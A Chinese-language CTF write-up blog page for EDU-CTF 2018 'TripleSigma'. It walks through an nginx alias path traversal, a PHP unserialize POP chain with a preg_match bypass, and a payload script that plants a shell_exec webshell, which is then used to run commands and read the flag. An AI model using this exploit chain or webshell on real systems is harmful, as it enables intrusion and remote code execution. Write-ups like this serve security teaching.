@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.woolninesun.org","root":"/","scheme":"Gemini","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false};
+  </script>
+
+  <meta name="description" content="這題包含很多知識，在做的時候查很多資料而收穫良多，從 nginx 漏洞到 PHP POP 都有。推薦大家先自己做做看！因為很有趣，從 22:00 解到 07:00 …">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EDU-CTF 2018 - TripleSigma">
+<meta property="og:url" content="https://blog.woolninesun.org/posts/9aeb46bc/index.html">
+<meta property="og:site_name" content="奈尚羊毛">
+<meta property="og:description" content="這題包含很多知識，在做的時候查很多資料而收穫良多，從 nginx 漏洞到 PHP POP 都有。推薦大家先自己做做看！因為很有趣，從 22:00 解到 07:00 …">
+<meta property="og:locale">
+<meta property="article:published_time" content="2019-02-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-02-01T16:00:00.000Z">
+<meta property="article:author" content="WooLNinesun">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.woolninesun.org/posts/9aeb46bc/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>EDU-CTF 2018 - TripleSigma | 奈尚羊毛</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <main class="main">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+        <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">奈尚羊毛</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">願如同童話裡的山羊般咀嚼知識</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首頁">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
+
+  </li>
+        <li class="menu-item menu-item-文章">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>文章</a>
+
+  </li>
+        <li class="menu-item menu-item-分類">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分類</a>
+
+  </li>
+        <li class="menu-item menu-item-關於">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-留言">
+
+    <a href="/comments/" rel="section"><i class="fa fa-comments fa-fw"></i>留言</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">1.</span> <span class="nav-text">[正文]</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nginx-%E7%9B%AE%E9%8C%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.1.</span> <span class="nav-text">Nginx 目錄穿越漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis"><span class="nav-number">1.1.</span> <span class="nav-text">Analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-get-contents-%E5%92%8C-file-put-contents"><span class="nav-number">1.1.1.</span> <span class="nav-text">file_get_contents 和 file_put_contents</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unserialize"><span class="nav-number">1.1.2.</span> <span class="nav-text">unserialize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-Global-space"><span class="nav-number">1.1.3.</span> <span class="nav-text">PHP Global space</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Create-payload"><span class="nav-number">1.2.</span> <span class="nav-text">Create payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-shell"><span class="nav-number">1.3.</span> <span class="nav-text">Get shell</span></a></li></ol></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WooLNinesun"
+      src="/uploads/avatar.png">
+  <p class="site-author-name" itemprop="name">WooLNinesun</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/woolninesun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;woolninesun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:WooLNinesun+blog@gmail.com" title="E-Mail → mailto:WooLNinesun+blog@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </header>
+
+      
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div id="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+      <div class="main-inner">
+        
+
+        <div class="content post posts-expand">
+          
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="https://blog.woolninesun.org/posts/9aeb46bc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="WooLNinesun">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="奈尚羊毛">
+    </span>
+
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          EDU-CTF 2018 - TripleSigma
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-02-02 00:00:00" itemprop="dateCreated datePublished" datetime="2019-02-02T00:00:00+08:00">2019-02-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Capture-The-Flag/" itemprop="url" rel="index"><span itemprop="name">Capture The Flag</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Capture-The-Flag/EDU-CTF-2018/" itemprop="url" rel="index"><span itemprop="name">EDU-CTF 2018</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>這題包含很多知識，在做的時候查很多資料而收穫良多，從 nginx 漏洞到 PHP POP 都有。推薦大家先自己做做看！因為很有趣，從 22:00 解到 07:00 …</p>
+<a id="more"></a>
+
+<h1 id="正文"><a href="#正文" class="headerlink" title="[正文]"></a>[正文]</h1><p>先觀察頁面有沒有漏洞，初步觀察後發現是用 nginx 架設，有 static 子目錄，推測有 nginx 路徑漏洞，網址輸入：<code>http://final.kaibro.tw:10004/static../</code>，成功拿到 source code。</p>
+<div class="note info"><h3 id="Nginx-目錄穿越漏洞"><a href="#Nginx-目錄穿越漏洞" class="headerlink" title="Nginx 目錄穿越漏洞"></a>Nginx 目錄穿越漏洞</h3><p>常見於 Nginx 做 Reverse Proxy 的狀況，例如 config 設置 <code>location /files { alias /home/ }</code><br>會因為 <code>/files</code> 沒有加上結尾 <code>/</code> ，而 <code>/home/</code> 有，所以 <code>/files../</code> 可以訪問上層目錄</p>
+</div>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site</span><br><span class="line">├── static</span><br><span class="line">│   ├── ...</span><br><span class="line">│   └── js</span><br><span class="line">│       └── k.js</span><br><span class="line">├── lib</span><br><span class="line">│   ├── class_articlebody.php</span><br><span class="line">│   ├── class_article.php</span><br><span class="line">│   ├── class_avatar.php</span><br><span class="line">│   ├── class_cookie.php</span><br><span class="line">│   ├── class_debug.php</span><br><span class="line">│   ├── class_filemanager.php</span><br><span class="line">│   ├── class_oldfm.php</span><br><span class="line">│   ├── class_user.php</span><br><span class="line">│   ├── ...</span><br><span class="line">├── avatar.php</span><br><span class="line">├── blog.php</span><br><span class="line">├── footer.php</span><br><span class="line">├── header.php</span><br><span class="line">├── index.php</span><br><span class="line">├── joinus.php</span><br><span class="line">├── login.php</span><br><span class="line">├── logout.php</span><br><span class="line">├── register.php</span><br><span class="line">├── team.php</span><br><span class="line">└── user.php</span><br></pre></td></tr></table></figure>
+
+<p><code>class_oldfm.php</code> 很坑，裡面滿滿的漏洞，但是沒有被引用 QQ，另外 <code>k.js</code> 的內容是 Konami Code ( ⇧⇧⇩⇩⇦⇨⇦⇨ⒷⒶ ) 的梗，輸入後會在 console 印奇怪的訊息</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>首先可以發現在 class_user.php 裡可以找到 username 和 password，先登入看看，可以發現 blog 頁面可以留言了。不知道能幹麻，先放著。先搜尋可能有漏洞的函式：</p>
+<h3 id="file-get-contents-和-file-put-contents"><a href="#file-get-contents-和-file-put-contents" class="headerlink" title="file_get_contents 和 file_put_contents"></a>file_get_contents 和 file_put_contents</h3><ol>
+<li>發現 OldFileManager 可以用，但是 trace 一下發現他根本沒有被 include..</li>
+<li>參數都不可控制，死路。</li>
+</ol>
+<h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h3><ol>
+<li><p>發現在 <code>class_cookie.php</code> 的 <code>MyCookie::__construct()</code> 有 <code>unserialize()</code>，參數可以藉由 <code>$_cookie[&quot;e&quot;]</code> 來控制</p>
+<figure class="highlight php"><figcaption><span>class_cookie.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$enc = $_COOKIE[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$dec = base64_decode(strrev($enc));</span><br><span class="line">$arr = explode(<span class="string">&quot;|&quot;</span>, $dec); <span class="comment">// 可以構造成 “1234|payload”</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>unserialize 後的 object 會 assign 給 <code>$this-&gt;article</code></p>
+<figure class="highlight php"><figcaption><span>class_cookie.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(count($arr) === <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;uid = $arr[<span class="number">0</span>];</span><br><span class="line">    $obj = unserialize($arr[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;article = $obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在 <code>blog.php</code> 發現它 <code>new MyCookie()</code> 後使用 <code>MyCookie::restore()</code></p>
+<figure class="highlight php"><figcaption><span>blog.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;e&#x27;</span>])) &#123;</span><br><span class="line">    $myck = <span class="keyword">new</span> MyCookie();</span><br><span class="line">    $r = $myck-&gt;restore();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $r = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>回到 <code>class_cookie.php</code> 查看，可以發現 <code>MyCookie::restore()</code> 回傳的就是可以控制的 <code>$this-&gt;article</code>，表示我們也能夠控制 <code>blog.php</code> 的 <code>$r</code></p>
+<figure class="highlight php"><figcaption><span>class_cookie.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">restore</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;uid !== <span class="literal">NULL</span> &amp;&amp; <span class="keyword">$this</span>-&gt;article !== <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;article; </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在 <code>blog.php</code> 裡面繼續往下發現 <code>$r</code> 會被丟進 <code>print_title($r)</code> 和 <code>print_content($r)</code>，這兩個都會 <code>echo $r-&gt;body-&gt;title</code>，找找看其他 class 有沒有好用的 <code>__toString</code> 可以用</p>
+<figure class="highlight php"><figcaption><span>blog.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_title</span>(<span class="params">$r</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($r)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $r-&gt;body-&gt;title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_content</span>(<span class="params">$r</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($r)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $r-&gt;body-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>不難發現只有 <code>class_debug.php</code> 的 <code>Debug::__toString()</code> 能夠使用，其他的都沒有在額外 call function，找找看其他 class 有沒有好用的 <code>save()</code> 可以用</p>
+<figure class="highlight php"><figcaption><span>class_debug.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $str = <span class="string">&quot;[DEUBG]&quot;</span> . $msg;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;fm-&gt;save(); </span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在 <code>class_filemanager.php</code>, <code>class_article.php</code>, <code>class_user.php</code> 都有發現<code>save()</code></p>
+<ul>
+<li><code>class_filemanager.php</code>, <code>class_article.php</code> 的 <code>save()</code>，雖然都有 <code>file_put_contents</code>，但參數都不可控，死路。</li>
+<li>剩下 <code>class_user.php</code> 的 <code>save()</code>，可以發現 <code>($this-&gt;func)($this-&gt;data)</code> 且 <code>$this-&gt;func</code> 和<code>$this-&gt;data</code> 都可以透過 <code>unserialize()</code> 的時候就控制到！<figure class="highlight php"><figcaption><span>class_user.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data))</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = User::getAllUser();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]/is&quot;</span>, <span class="keyword">$this</span>-&gt;func)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;func === <span class="string">&quot;shell_exec&quot;</span>) &#123;</span><br><span class="line">            (<span class="keyword">$this</span>-&gt;func)(<span class="string">&quot;echo &quot;</span> . escapeshellarg(<span class="keyword">$this</span>-&gt;data) . <span class="string">&quot; &gt; /tmp/result&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;func)(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>剩下如何 bypass <code>preg_match(&quot;/^[a-z]/is&quot;, $this-&gt;func)</code>，找了一些資料後後發現加入反斜線可以成功 bypass: <code>$func = &#39;\shell_exec&#39;</code>。</p>
+<div class="note info"><h3 id="PHP-Global-space"><a href="#PHP-Global-space" class="headerlink" title="PHP Global space"></a>PHP Global space</h3><p>在 PHP ( &gt;= 5.3.0, 7) 中在名稱前加上前綴 <code>\</code> 表示該名稱是全局空間中的名稱，是合法的 syntax。</p>
+</div>
+</li>
+<li><p>整個 POPchain：Article.body -&gt; ArticleBody.content -&gt; Debug.__toString() -&gt; User.save()</p>
+</li>
+</ol>
+<h2 id="Create-payload"><a href="#Create-payload" class="headerlink" title="Create payload"></a>Create payload</h2><ol>
+<li><p>因為他是直接 <code>($this-&gt;func)($this-&gt;data)</code> 不會 echo 出來，所以必須想辦法找到可讀寫的地方，在 <code>class_article.php</code> 下發現 <code>/var/www/app/articles/</code> 這個路徑，看起來可讀寫，建立 webshell payload：<code>$data = &#39;echo \&#39;&lt;?=shell_exec($_GET[0]);?&gt;\&#39; &gt;/var/www/app/articles/&lt;name&gt;.php&#39;</code></p>
+<figure class="highlight php"><figcaption><span>payload.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;lib/class_article.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;lib/class_articlebody.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;lib/class_cookie.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;lib/class_user.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;lib/class_debug.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;lib/class_filemanager.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$title = <span class="string">&quot;title&quot;</span>;</span><br><span class="line">$content = <span class="keyword">new</span> Debug(<span class="string">&quot;content&quot;</span>);</span><br><span class="line">$content-&gt;fm = <span class="keyword">new</span> User();</span><br><span class="line">$content-&gt;fm-&gt;func = <span class="string">&quot;\shell_exec&quot;</span>;</span><br><span class="line">$content-&gt;fm-&gt;data = <span class="string">&quot;echo \&#x27;&lt;?=shell_exec($_GET[0]);?&gt;\&#x27; &gt;/var/www/app/articles/VHJpcGxlIFNpZ21hIH.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$article = <span class="keyword">new</span> Article( $title, $content );</span><br><span class="line">$article-&gt;author = <span class="string">&quot;article&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> strrev( base64_encode( <span class="string">&quot;1234|&quot;</span> . serialize( $article ) ) );</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><ol>
+<li><p>執行 <code>php payload.php</code> 後得到的 payload 丟進 <code>cookie[e]</code>，重整後到 webshell 的頁面。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> php payload.php</span></span><br><span class="line">=0Xf913OiAHaw5CaFlmYxo1RJBjVul1ZR12Yoh2RJZnTIlEaxIjWw5kRJ ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>Http request</span></figcaption><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;final.kaibro.tw:10004&#x2F;articles&#x2F;VHJpcGxlIFNpZ21hIH.php</span><br><span class="line">GET 0&#x3D;ls%20&#x2F;                # 發現 _fl4g___yo, readflag</span><br><span class="line">GET 0&#x3D;ls%20-al%20%2F        # 發現 _fl4g___yo 沒辦法 cat</span><br><span class="line">GET 0&#x3D;&#x2F;readflag             # 直接執行 readflag -&gt; get flag</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>FLAG: <code>FLAG&#123;b4d_ng1nx_4nd_l0000ng_p0p_cha1n&#125;</code></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>WooLNinesun
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://blog.woolninesun.org/posts/9aeb46bc/" title="EDU-CTF 2018 - TripleSigma">https://blog.woolninesun.org/posts/9aeb46bc/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/466363de/" rel="prev" title="EDU-CTF 2018 - DuoRenSnake">
+      <i class="fa fa-chevron-left"></i> EDU-CTF 2018 - DuoRenSnake
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/7a4db81b/" rel="next" title="使用 pyenv 建立獨立的 Jupyter kernels！">
+      使用 pyenv 建立獨立的 Jupyter kernels！ <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+        </div>
+        
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WooLNinesun</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
